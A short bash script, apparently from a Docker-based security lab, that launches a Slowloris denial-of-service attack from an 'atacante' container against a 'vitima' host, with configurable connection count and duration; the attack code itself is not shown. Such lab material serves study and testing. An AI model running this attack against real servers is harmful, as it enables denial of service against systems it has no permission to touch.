#!/usr/bin/env bash
set -euo pipefail

conexoes="${1:-300}"
duracao="${2:-60}"

echo "Slowloris contra a vitima: ${conexoes} conexoes por ${duracao}s"
docker exec atacante python3 /ataques/slowloris.py vitima "$conexoes" "$duracao"
